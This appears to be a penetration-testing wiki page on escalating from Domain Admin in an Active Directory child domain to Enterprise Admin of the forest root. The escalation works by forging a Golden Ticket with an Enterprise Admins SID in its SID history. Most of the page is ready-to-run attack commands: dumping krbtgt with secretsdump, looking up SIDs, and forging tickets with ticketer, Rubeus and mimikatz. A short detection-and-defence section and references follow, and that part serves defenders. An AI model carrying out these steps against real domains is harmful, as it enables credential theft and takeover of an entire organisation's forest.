---
title: Child domain → forest root
slug: child-to-forest-root
---

> **TL;DR:** A Domain Admin in any child domain can forge a Golden Ticket whose PAC contains a SID-History entry pointing at Enterprise Admins of the forest root — and the parent-child trust accepts it because SID filtering is disabled by default on intra-forest trusts.

## What it is
Active Directory forests are a single security boundary, not multiple. The parent↔child trust is *transitive* and unconditionally trusts SIDs from either side. By placing a SID-History claim for `S-1-5-21-<rootdomain>-519` (Enterprise Admins) inside a forged TGT, an attacker who controls a child DC's `krbtgt` hash promotes themselves to forest-wide admin without ever touching the root DC.

## Preconditions / where it applies
- Domain Admin in a child domain (so you can dump child `krbtgt` via DCSync)
- Root domain SID — readable from any DC via LDAP (`objectSid` of the root domain root)
- Network reach from compromised box to a root-domain DC
- Default SID filter posture (intra-forest trusts do not quarantine SID-History)

## Technique
1. As child DA, dump the child `krbtgt` hash:

```bash
secretsdump.py -just-dc-user 'CHILD/krbtgt' child.corp.local/da:pass@dc01.child.corp.local
```

2. Note the child domain SID and root domain SID (the root SID + `-519` is Enterprise Admins):

```bash
lookupsid.py corp.local/da:pass@dc-root.corp.local 0
```

3. Forge a Golden Ticket in the child, with `extraSids` claiming Enterprise Admins of the root:

```bash
ticketer.py -nthash <child_krbtgt_nt> -domain-sid S-1-5-21-CHILD \
  -domain child.corp.local \
  -extra-sid S-1-5-21-ROOT-519 administrator
export KRB5CCNAME=administrator.ccache
```

4. Use the ticket against root-domain services — DCSync the root or psexec to a root DC:

```bash
secretsdump.py -k -no-pass -just-dc dc-root.corp.local
```

Rubeus equivalent on Windows: `Rubeus.exe golden /user:Administrator /domain:child.corp.local /sid:<child> /sids:<root>-519 /krbtgt:<hash> /ptt`.

mimikatz' `lsadump::trust /patch` plus a forged inter-realm TGT (the "trust-key" variant) is the alternative when child `krbtgt` is unavailable — abusing the trust account `CHILD$` against the root.

The SID-substitution trick is mechanical: take the parent-domain SID you already enumerated, and swap the trailing RID from `-502` (krbtgt) to `-519` (Enterprise Admins) — that becomes the `sids`/`extra-sid` value in the forge command. mimikatz equivalent: `kerberos::golden /user:Administrator /domain:child.corp.local /sid:<child-SID> /sids:<root-SID>-519 /krbtgt:<child_krbtgt_nt> /ptt`. The forged ticket grants Enterprise Admin only when consumed by a parent-domain service (the parent DC honours the extra SID via the trust); against unrelated forests you need an actual inter-forest trust without SID filtering, which is rare.

## Detection and defence
- Enable SID filtering / quarantine on the child→parent trust (Microsoft's tightened guidance post-2022 supports this even intra-forest)
- Detect anomalous `extraSids` on inbound cross-domain TGS; ETW `Microsoft-Windows-Kerberos-Key-Distribution-Center` exposes PAC contents
- Treat every child-domain DA as forest-equivalent — there is no security boundary inside the forest
- Roll the child `krbtgt` twice if compromise is suspected; a single rotation still allows the existing forged tickets to validate for 10h

## References
- [HackTricks — child-to-parent SID History](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/sid-history-injection.html) — step-by-step
- [Hacker Recipes — intra-forest trust abuse](https://www.thehacker.recipes/a-d/movement/trusts) — protocol background
- [SpecterOps — A guide to attacking domain trusts](https://posts.specterops.io/a-guide-to-attacking-domain-trusts-ef5cbe06e2e2) — foundational reading
- [ired.team — child DA to Enterprise Admin](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain) — mimikatz forge + SID-history walkthrough
- See also: [[golden-tickets]], [[dcsync]], [[cross-forest-trust-abuse]]
